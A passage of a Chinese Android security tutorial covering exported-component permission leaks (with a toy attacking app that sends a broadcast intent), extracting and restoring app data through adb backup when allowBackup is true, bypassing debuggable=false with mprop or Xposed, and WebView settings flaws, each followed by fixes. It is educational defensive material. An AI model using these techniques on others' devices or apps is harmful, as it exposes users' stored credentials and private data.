title="1.漏洞原理"></a>1.漏洞原理</h3><p>介绍权限漏洞之前，我们先讲解一下Android组件基本知识，前几篇帖子我们也介绍过，Android程序运行在独立的沙箱环境中，相互隔离，为了方便通信，Android提供了组件间的通信（ICC）机制，允许满足条件的组件相互传递数据，ICC的实现依赖于Intent和Binder机制，其底层是通过进程间通信来实现的。在组件的通信过程中，Intent是数据传播的载体，通信发起方发送Intent，携带执行的动作、动作相关的数据和附加数据等信息，通信接收方预先定义自身的Intent-filter，intent-filter中包含能够响应intent的动作和数据类型，声明能够响应的intent请求，应用程序框架在通信发起Intent后，负责找到能处理该Intent的接收方。</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/4.png" alt="image-20211026112045142"></p><p>组件间通信的一个前提是接收方组件必须公开，Android中的组件分为公开组件和私有组件，具体有export是否可导出决定，而Android权限泄漏漏洞就是由于不合理的公开了组件或者没有对接收的Intent进行合法性校验导致，其表现为将一个拥有权限的API通过公开组件暴露给外界，攻击者可以构造数据访问这个API达到权限提升的效果，一般表现为两个方面：隐私获取和动作执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">隐私获取：指的是攻击者通过构造数据访问存在权限泄露漏洞的程序组件，并让该组件返回隐私数据，这些数据包括短信消息、联系人信息、地理位置、邮件信息等等</span><br><span class="line">动作执行：指的是攻击者构造数据访问存在权限泄露的程序组件，让该组件执行系统破坏等恶意的操作，例如结束系统服务、拨打电话、删除程序数据等</span><br></pre></td></tr></table></figure><p>具体的示意图如下所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/5.png" alt="image-20211026112525986"></p><p>应用程序B是一个拥有权限P1的应用程序，包含组件C1，C1组件是公开给外界，意为export &#x3D; true，并且C1组件可以访问权限P1对应的系统资源，这样另外一个没有权限P1的应用程序A，可以构造Intent数据去启动应用程序B的C1组件，进而访问到P1权限对应的系统资源，拥有权限P1的应用程序B没有对权限合理的保护，引发了权限泄漏，没有权限P1的应用程序A利用这个漏洞获得了权限，导致了权限泄漏</p><h3 id="2-漏洞案例"><a href="#2-漏洞案例" class="headerlink" title="2.漏洞案例"></a>2.漏洞案例</h3><h4 id="（1）下载文件权限泄漏漏洞"><a href="#（1）下载文件权限泄漏漏洞" class="headerlink" title="（1）下载文件权限泄漏漏洞"></a>（1）下载文件权限泄漏漏洞</h4><p><strong>目标程序：</strong></p><p>配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">&lt;!--网络--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 读写文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.Download&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.down&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Download</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> This method is called when the BroadcastReceiver is receiving</span></span><br><span class="line">        <span class="comment">// an Intent broadcast.</span></span><br><span class="line">        <span class="keyword">if</span>(intent.getAction().equals(<span class="string">&quot;com.example.down&quot;</span>))&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> intent.getExtras().getString(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> intent.getExtras().getString(<span class="string">&quot;fileName&quot;</span>);</span><br><span class="line">            Toast.makeText(context,<span class="string">&quot;Downlaod start!&quot;</span>+url+<span class="string">&quot;---&quot;</span>+fileName,Toast.LENGTH_LONG).show();</span><br><span class="line">            Log.i(<span class="string">&quot;test&quot;</span>,url+fileName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//throw new UnsupportedOperationException(&quot;Not yet implemented&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>攻击程序：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(<span class="string">&quot;com.example.down&quot;</span>);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;url&quot;</span>,<span class="string">&quot;https://www.baidu.com/&quot;</span>);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;filename&quot;</span>,<span class="string">&quot;baidu&quot;</span>);</span><br><span class="line">        sendBroadcast(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果显示：</strong></p><p>测试样例：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/6.png" alt="image-20211026135228985"></p><p>攻击样例：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/7.png" alt="image-20211026135354598"></p><p>我们可以很明显发现，我们可以通过进程B发送广播到进程A，从而调用进程A的下载功能，开始下载</p><h4 id="（2）猎豹清理大师内存清理权限泄漏漏洞"><a href="#（2）猎豹清理大师内存清理权限泄漏漏洞" class="headerlink" title="（2）猎豹清理大师内存清理权限泄漏漏洞"></a>（2）猎豹清理大师内存清理权限泄漏漏洞</h4><p>这个案例是一个很早之前的漏洞，现在参考意义不大，不过大家可以借助其学习其原理即可</p><p><strong>漏洞描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Android应用程序猎豹清理大师存在自定义的权限android.permission.RESTART_PACKAGES，该权限主要用来结束进程来达到清理内存的目的，当其他没有申请此权限的app向目标程序发送相应的intent时，便可以结束后台运行的部分app进程</span><br></pre></td></tr></table></figure><p><strong>漏洞实现：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/8.png" alt="image-20211026140524902"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/9.png" alt="image-20211026140633874"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/10.png" alt="image-20211026140609720"></p><p>这就是很典型的我们利用个人定义的权限，来攻击目标程序，达到权限泄漏漏洞的目标</p><h3 id="3-漏洞防护"><a href="#3-漏洞防护" class="headerlink" title="3.漏洞防护"></a>3.漏洞防护</h3><h4 id="（1）组件设置不可导出"><a href="#（1）组件设置不可导出" class="headerlink" title="（1）组件设置不可导出"></a>（1）组件设置不可导出</h4><p>我们从上面的两个案例可以发现，Android的权限泄漏漏洞往往和四大组件相互关联，我们对一些重要组件设置不可导出，就可以达到一定的保护效果</p><h4 id="（2）设置权限级别"><a href="#（2）设置权限级别" class="headerlink" title="（2）设置权限级别"></a>（2）设置权限级别</h4><p>我们可以对自定义的权限一定要设置相应的保护级别，从上文我们可以得出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">android:protectionLevel=&quot;normal&quot;，不需要动态申请 </span><br><span class="line">android:protectionLevel=&quot;dangerous&quot;，需要动态申请</span><br><span class="line">android:protectionLevel=&quot;signature|signatureOrSystem&quot;,需要两个程序签名相同才能访问，这样就可以很好的避免权限泄漏的风险</span><br></pre></td></tr></table></figure><h2 id="四、Android默认设置介绍"><a href="#四、Android默认设置介绍" class="headerlink" title="四、Android默认设置介绍"></a>四、Android默认设置介绍</h2><p>在上文中已经向大家详细介绍了Android中的权限安全漏洞的情况，接下来我们进一步了解Android中的默认设置以及默认设置引起的安全问题，Android中的默认设置主要分为：AndroidManifest.xml配置文件和WebView的默认设置</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/11.png" alt="image-20211026144059511"></p><h4 id="（1）AndroidManifest-xml默认设置"><a href="#（1）AndroidManifest-xml默认设置" class="headerlink" title="（1）AndroidManifest.xml默认设置"></a>（1）AndroidManifest.xml默认设置</h4><p>这里我总结了AndroidManifest.xml的基本结构图</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/12.png" alt="image-20211026144059511"></p><p>这里我们主要关注allowBackup、Debuggable、组件默认导出</p><h5 id="lt-1-gt-allowBackup"><a href="#lt-1-gt-allowBackup" class="headerlink" title="&lt;1&gt; allowBackup"></a>&lt;1&gt; allowBackup</h5><p>Android API Level 8及其以上Android系统提供了应用程序的备份和恢复功能，这是由AndroidManifest.xml文件中的<code>allowBackup</code>属性决定，allowBackup 标志为 true 时，用户即可通过 <code>adb backup</code> 和 <code>adb restore</code> 来进行对应用数据的备份和恢复</p><p>Android 属性allowBackup 安全风险源于adb backup容许任何一个人能够打开USB调试开关，从Android手机中复制应用数据到外设，一旦数据被备份之后，所有应用数据都可被用户读取。<code>adb restore</code> 容许用户指定一个恢复的数据来源（即备份的应用数据）来恢复应用程序数据的创建</p><p><strong>安全影响：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通讯录应用，一旦应用程序支持备份和恢复功能，攻击者即可通过 adb backup 和 adb restore 进行恢复新安装的同一个应用来查看聊天记录等信息</span><br><span class="line">支付金融类应用，攻击者可通过此来进行恶意支付、盗取存款等</span><br></pre></td></tr></table></figure><p><strong>allowBackup安全风险详情：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.allowBackup 风险位置：AndroidMannifest.xml 文件 android:allowBackup 属性</span><br><span class="line">2.allowBackup 风险触发前提条件：未将 AndroidMannifest.xml 文件中的 android:allowBackup 属性值设为 false</span><br><span class="line">3.allowBackup 风险原理：当 allowBackup 标志值为 true 时，即可通过 adb backup 和 adb restore 来备份和恢复应用程序数据</span><br></pre></td></tr></table></figure><p><strong>数据备份：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">命令：adb backup  [-system|nosystem] -all [-apk|-noapk] [-shared|-noshared] -f &lt;档案名称&gt;[需要备份的应用包名]</span><br><span class="line">    </span><br><span class="line">[-system|nosystem]</span><br><span class="line">这个指令告诉adb在备份时是否要连同系统一起备份，若没有打开的话，默认是-system表示会一起备份系统，若连系统一起备份，在还原时候会覆盖系统档案，这对已经升级的手机是非常不好的，-nosystem是建议要打上去的指令</span><br><span class="line"></span><br><span class="line">-all</span><br><span class="line">这个指令除非要备份单一App不然是一定要打上去的，表示是否备份全部的App，若有加上`-nosystem`，就只会备份你目前已经安装上去的App而不会连系统App一起备份</span><br><span class="line"></span><br><span class="line">[-apk|-noapk]</span><br><span class="line">默认是-noapk，这个参数的意思是，是否连安装的apk一起备份，若为-noapk，则只会备份apk的资料档</span><br><span class="line"></span><br><span class="line">[-shared|-noshared]</span><br><span class="line">默认是`-noshared`，表示是否连手机存储空间或是SD卡的档案一起备份</span><br><span class="line"></span><br><span class="line">-f</span><br><span class="line">用这个来选择备份文件存储在哪里，例如-f /backup/applock.ab将会使文件存储在根磁盘（Windows的C盘等等）下一个名为backup的文件夹里，并且备份文件名为applock.ab</span><br></pre></td></tr></table></figure><p>例如我们直接备份</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb backup  -apk  -shared  -system  -all  -f  applock.ab</span><br></pre></td></tr></table></figure><p>就会在电脑默认路径下产生applock.ab文件，大小与系统有关</p><p><strong>查看数据：</strong></p><p>一般我们使用abe工具来解析ab文件，工具参考网址：<a href="https://github.com/nelenkov/android-backup-extractor/releases">abe工具</a></p><p>解压命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ade.jar unpack <span class="number">1.</span>ab <span class="number">1.</span>tar </span><br></pre></td></tr></table></figure><p><strong>恢复数据：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb restore applock.ab</span><br></pre></td></tr></table></figure><h5 id="lt-2-gt-debuggable"><a href="#lt-2-gt-debuggable" class="headerlink" title="&lt;2&gt; debuggable"></a>&lt;2&gt; debuggable</h5><p><code>android:debuggable</code>属性是指定应用程序是否能够被调试，即时是以用户模式运行在设备上的时候，如果设置为 true ，则能够被调试，否则不能调试，默认值是false</p><p>逆向工作人员在对一个apk程序进行逆向时，第一步往往就是要对debuggable属性进行绕过，否则就不能进行正常的调试，因此如果属性本身设为true，更容易导致该应用存在动态调试，泄露数据信息的风险</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/13.png" alt="image-20211026164320202"></p><h5 id="lt-3-gt-exported"><a href="#lt-3-gt-exported" class="headerlink" title="&lt;3&gt; exported"></a>&lt;3&gt; exported</h5><p>前几篇帖子，我们讲述四大组件过程中，经常会涉及到exported导出导致的漏洞，exported组件导出，会导致导出的组件被第三方APP任意调用，导致敏感信息，并可能受到绕过认证、恶意代码注入等风险，由于前面我们已经讲得很详细了，这里就不再做过多描述</p><h4 id="（2）WebView默认设置"><a href="#（2）WebView默认设置" class="headerlink" title="（2）WebView默认设置"></a>（2）WebView默认设置</h4><p>WebView是android中用来展示网页的重要控件，Android中经常会使用WebView来实现Web页面的展示，在Activity中启动自己的浏览器或者简单的展示一些在线内容等，而WebView上的漏洞问题也各种各样，过去几年内WebView中被披露的重大漏洞包括了任意代码执行漏洞、跨域、密码明文保存等，后面我们将WebView作为一个专题讲述上面存在的漏洞问题，这里我们只关注WebView中默认设置的安全问题</p><p>后面我们主要讲述WebView上几方面的默认设置漏洞</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/14.png" alt="image-20211026165646971"></p><h2 id="五、Android默认设置漏洞原理分析和复现"><a href="#五、Android默认设置漏洞原理分析和复现" class="headerlink" title="五、Android默认设置漏洞原理分析和复现"></a>五、Android默认设置漏洞原理分析和复现</h2><h3 id="1-allowBackup"><a href="#1-allowBackup" class="headerlink" title="1. allowBackup"></a>1. allowBackup</h3><h4 id="（1）备份安全设置信息泄露漏洞"><a href="#（1）备份安全设置信息泄露漏洞" class="headerlink" title="（1）备份安全设置信息泄露漏洞"></a>（1）备份安全设置信息泄露漏洞</h4><p>上文我们已经详细的给大家讲述了<code>allowBackup</code>设置<code>true</code>的安全性，接下来我拿一个案例带大家深入了解：</p><h5 id="lt-1-gt-漏洞复现"><a href="#lt-1-gt-漏洞复现" class="headerlink" title="&lt;1&gt; 漏洞复现"></a>&lt;1&gt; 漏洞复现</h5><p>样本：sieve.apk</p><p><strong>信息设置：</strong></p><p>首先，我们将样本安装到手机上，并打开主界面</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/15.png" alt="image-20211026194532102"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/16.png" alt="image-20211026194611643"></p><p>进入主程序我们发现，提示我们注册密码，而且需要至少16位，这里我们输入密码<code>zxcvbnm0123456789</code></p><p>进入后，又要我们输入PIN码，我们输入<code>1234</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/18.png" alt="image-20211026195015970"></p><p>然后我们发现需要再次输入密码才能进入，我们再次输入密码</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/19.png" alt="image-20211026195112662"></p><p>发现右上角可以添加账户密码信息，我们添加，密码设置<code>123456</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/20.png" alt="image-20211026195256415"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/21.png" alt="image-20211026195314419"></p><p>这样我们就在apk中就存入了一些信息，接下来我们来看如何备份和恢复这些信息呢</p><p><strong>数据备份：</strong></p><p>我们先用jadx-gui打开目标程序，查看allowbackup&#x3D;true</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/22.png" alt="image-20211026195645086"></p><p>这里发现是可以备份的，所以我们输入备份命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb backup -f allowBackup.ab -noapk com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/23.png" alt="image-20211026195847860"></p><p>我们的手机就弹出备份请求，如果你要加密就输入加密密码，这里我们直接备份</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/24.png" alt="image-20211026195945086"></p><p>备份完成后，我们在当前目录下就可以发现我们备份的文件<code>allowBackup.ab</code></p><p><strong>数据解析：</strong></p><p>我们需要使用<code>abe</code>工具对备份的文件解压，下载路径：<a href="https://github.com/nelenkov/android-backup-extractor/releases"><code>abe工具</code></a></p><p>我们下载后，需要安装jdk环境，然后使用命令解压：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar abe.jar unpack allowBackup.ab <span class="number">1.</span>tar</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/25.png" alt="image-20211026200752183"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/26.png" alt="image-20211026200815420"></p><p>解压</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/27.png" alt="image-20211026200904172"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/28.png" alt="image-20211026200925823"></p><p>我们就得到了database.db数据库，然后我们使用DB Browser for SQLite打开，下载路径：<a href="https://sqlitebrowser.org/">DB Browser</a></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/29.png" alt="image-20211026201414775"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/30.png" alt="image-20211026201601455"></p><p>这样我们就成功解析出了备份的数据信息</p><p><strong>数据恢复：</strong></p><p>我们卸载目标程序，然后重新安装</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/32.png" alt="image-20211026204949157"></p><p>我们输入恢复命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb restore allowBackup.ab </span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/31.png" alt="image-20211026202027001"></p><p>然后我们恢复数据，数据恢复完成</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/33.png" alt="image-20211026205126480"></p><p>我们再次进入发现，直接进入之前界面，说明此时我们输入之前密码，就可以成功的进入</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/34.png" alt="image-20211026205258432"></p><p>登录成功，并且出现我们之前的密码信息</p><h5 id="lt-2-gt-漏洞说明"><a href="#lt-2-gt-漏洞说明" class="headerlink" title="&lt;2&gt; 漏洞说明"></a>&lt;2&gt; 漏洞说明</h5><p>上文我们拿一个样例，带大家完整的复现了一遍数据备份漏洞的过程，这个过程中如果我们发现一个目标程序的<code>allowBackup</code>为true，我们可以备份下其数据信息，在另外一个安装该目标程序的手机中进行恢复，这样我们就可以获得用户的敏感数据信息了，另外一个类似的案例可以参考网址：<a href="https://segmentfault.com/a/1190000002590577">阿里聚安全allowBackup安全解析</a></p><h5 id="lt-3-gt-安全防护"><a href="#lt-3-gt-安全防护" class="headerlink" title="&lt;3&gt; 安全防护"></a>&lt;3&gt; 安全防护</h5><p>只需要将allowBackup设置为false即可</p><h4 id="（2）debuggable-安全风险"><a href="#（2）debuggable-安全风险" class="headerlink" title="（2）debuggable 安全风险"></a>（2）debuggable 安全风险</h4><p>我们知道<code>debuggable=true</code>，用户才能进行动态调试，下面就是<code>debuggable=false</code>，使用AndroidStudio调试的情况</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/35.png" alt="image-20211026210557350"></p><p>下面我们介绍几种方法绕过<code>debuggle=false</code></p><h5 id="lt-1-gt-使用mprop"><a href="#lt-1-gt-使用mprop" class="headerlink" title="&lt;1&gt; 使用mprop"></a>&lt;1&gt; 使用mprop</h5><p>mprop下载地址：<a href="https://github.com/wpvsyou/mprop">mprop</a></p><p>原理解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过修改 ro.debuggable =1 来达到调试的目的，由于不是从系统内核层面修改，所以系统重启之后需要重新配置</span><br></pre></td></tr></table></figure><p>配置过程：</p><p>首先， 将mprop文件拷贝到.&#x2F;data&#x2F;local&#x2F;tmp文件下 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push mprop /data/local/tmp</span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mprop ro.debuggable 1</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/36.png" alt="image-20211026210557350"></p><p>查询是否修改成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getprop ro.debuggable</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/37.png" alt="image-20211026210557350"></p><p>我们修改值后，还需要重启一下，使得进程被更新，使用命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stop;start</span><br></pre></td></tr></table></figure><p>此时我们就可以进行动态调试了</p><h5 id="lt-2-gt-使用Xposed模块"><a href="#lt-2-gt-使用Xposed模块" class="headerlink" title="&lt;2&gt; 使用Xposed模块"></a>&lt;2&gt; 使用Xposed模块</h5><p>xposed模块中很多都可以通过hook来修改 <code>ro.debuggable</code>的值，这里我们使用<code>App Debuggable</code>模块，<a href="https://repo.xposed.info/module/cn.forgiveher.appdebuggable">下载地址</a></p><p>使用过程十分简单，我们的手机上安装Xposed框架之后，我们只需要将模块安装上去，激活即可，Xposed框架安装详细看之前帖子</p><h5 id="lt-3-gt-系统定制"><a href="#lt-3-gt-系统定制" class="headerlink" title="&lt;3&gt; 系统定制"></a>&lt;3&gt; 系统定制</h5><p>我们也可以通过定制系统源码的方式来实现绕过，这里考虑到文章篇幅的原因，这里我收集了一个大佬的方法，相关教程我会放到github上，大家自行参考</p><h4 id="（3）exported导出漏洞"><a href="#（3）exported导出漏洞" class="headerlink" title="（3）exported导出漏洞"></a>（3）exported导出漏洞</h4><p>由于exported导出漏洞基本是和Android四大组件相关，我们在前面的帖子中已经将这里讲的比较详细了，大家可以回看前面的帖子</p><p><strong>安全防护：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）权限控制</span><br><span class="line">（2）设置export = false</span><br></pre></td></tr></table></figure><p>具体参考上文和前面帖子</p><h3 id="2-WebView安全配置漏洞"><a href="#2-WebView安全配置漏洞" class="headerlink" title="2. WebView安全配置漏洞"></a>2. WebView安全配置漏洞</h3><p>由于WebView涉及的漏洞较多，后面我会做一个专题归纳WebView的大部分漏洞的情况，这里只是简要列出一些配置相关的漏洞问题</p><h4 id="（1）漏洞原理"><a href="#（1）漏洞原理" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>webview控件将<code>setAllowFileAccessFromFileURLs</code>或<code>setAllowUniversalAcessFromFileURLsAPI</code>设置为<code>true</code>,开启了file域访问，且允许file域访问HTTP域，但是并未对file域的路径做严格限制</p><p>检测方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webview控件是否将setAllowFileAccessFromFileURLs或setAllowUniversalAcessFromFileURLsAPI设置为<span class="literal">true</span></span><br><span class="line">客户端是否对file:<span class="comment">//路径进行严格限制</span></span><br></pre></td></tr></table></figure><h4 id="（2）漏洞案例"><a href="#（2）漏洞案例" class="headerlink" title="（2）漏洞案例"></a>（2）漏洞案例</h4><h5 id="lt-1-gt-WebView密码明文存储漏洞——setSavePassword-true"><a href="#lt-1-gt-WebView密码明文存储漏洞——setSavePassword-true" class="headerlink" title="&lt;1&gt; WebView密码明文存储漏洞——setSavePassword(true)"></a>&lt;1&gt; WebView密码明文存储漏洞——setSavePassword(true)</h5><p>WebView默认开启密码保存功能 mWebView.setSavePassword(true)，如果该功能未关闭，在用户输入密码时，会弹出提示框，询问用户是否保存密码，如果用户确定，密码会被保存在<code>/data/data/com.package.name/databases/webview.db</code>，然后我们可以在root权限下直接拿出密码相关信息，因此建议用户密码加密存储</p><h5 id="lt-2-gt-WebView域控制不严格漏洞"><a href="#lt-2-gt-WebView域控制不严格漏洞" class="headerlink" title="&lt;2&gt; WebView域控制不严格漏洞"></a>&lt;2&gt; <strong>WebView域控制不严格漏洞</strong></h5><p><strong>setAllowFileAccess</strong></p><p>WebView默认开启密码保存功能 mWebView.setAllowFileAccess(true) 